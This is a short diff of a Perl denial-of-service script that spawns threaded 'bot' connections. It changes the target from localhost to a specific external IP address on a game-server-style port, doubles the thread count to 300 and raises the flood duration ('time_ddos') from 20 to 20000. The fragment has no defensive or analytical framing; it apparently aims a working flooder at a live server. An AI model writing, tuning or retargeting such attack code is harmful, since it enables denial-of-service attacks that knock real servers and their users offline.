@@ -1,10 +1,10 @@
 use Socket;
 use threads;
-$host = '127.0.0.1';
-$port = 25565;
-$thread = 150;
+$host = '135.148.6.172';
+$port = 25583;
+$thread = 300;
 $protocol = chr(47);
-$time_ddos = 20;
+$time_ddos = 20000;
 $connects = 0;
 for ($i=0;$i<=$thread;$i++){
     threads->new(\&new_bot);
